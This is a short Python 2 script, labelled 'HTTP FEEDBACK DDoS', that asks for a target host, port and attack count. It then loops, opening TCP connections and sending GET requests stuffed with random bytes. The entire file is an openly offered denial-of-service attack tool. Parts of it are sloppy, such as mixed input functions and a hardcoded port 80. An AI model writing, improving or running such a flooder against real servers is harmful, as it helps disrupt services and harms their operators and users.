import time, socket, os, sys, string, random
print("\n     -+--=:=- -==- -=:=--+-")
print("       HTTP FEEDBACK DDoS")
print("     -+--=:=- -==- -=:=--+-\n")
host=raw_input(" -+- Server: ")
port=int(input(" -+- Port: "))
message=random._urandom(1024)
conn=input( " -+- Attacks:" )
ip = socket.gethostbyname( host )
 
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
    except socket.error, msg:
        print("-[Connection Failed]-=@=--+-")
    print ( "-[Attack Executed]-=:=--+-")
    ddos.close()
 
for i in xrange(conn):
    dos()
